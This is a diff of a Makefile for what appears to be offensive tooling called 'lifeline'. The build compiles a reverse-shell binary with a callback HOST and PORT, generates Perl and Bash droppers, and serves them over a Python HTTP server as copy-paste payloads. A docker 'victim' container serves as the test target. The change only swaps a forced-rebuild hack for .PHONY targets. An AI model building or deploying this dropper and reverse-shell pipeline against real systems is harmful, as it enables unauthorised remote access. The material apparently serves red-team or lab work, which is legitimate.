@@ -7,10 +7,8 @@ NUM ?= 10
 # Settings for python -m http.server
 PY_PORT ?= 8000
 
-# Dirty hack to force a fresh make every time. (needed when flags are updated)
-hack := $(shell touch src/main.c)
-
-build/lifeline:	src/main.c src/reverse.c src/util.c Makefile
+.PHONY: lifeline
+lifeline:	src/main.c src/reverse.c src/util.c Makefile
 ifndef HOST
 	$(error HOST is not set, use "make HOST=x.x.x.x")
 endif
@@ -19,16 +17,20 @@ endif
 		-DHOST=\"$(HOST)\"					\
 		-DPORT=$(PORT)
 
-test:	build/lifeline
+.PHONY: test
+test:	lifeline
 	cd test; docker-compose run --rm victim
 
-build/dropper.pl:	build/lifeline extra/make_perl_dropper.sh
+.PHONY: dropper.pl
+dropper.pl:	lifeline extra/make_perl_dropper.sh
 	cd extra; ./make_perl_dropper.sh $(NUM)
 
-build/dropper.sh:	build/lifeline extra/make_bash_dropper.sh
+.PHONY: dropper.sh
+dropper.sh:	lifeline extra/make_bash_dropper.sh
 	cd extra; ./make_bash_dropper.sh $(HOST) $(PY_PORT) $(NUM)
 
-serve:	build/dropper.pl build/dropper.sh
+.PHONY: serve
+serve:	lifeline dropper.pl dropper.sh
 	@echo "========================================================="
 	@echo "  Hosting dropper on http://$(HOST):$(PY_PORT)...        "
 	@echo "  Copy/Paste payloads:                                   "
@@ -48,6 +50,7 @@ serve:	build/dropper.pl build/dropper.sh
 	@echo ""
 	@cd build; python3 -m http.server $(PY_PORT)
 
+.PHONY: clean
 clean:	
 	rm -f ./build/dropper.pl
 	rm -f ./build/dropper.sh
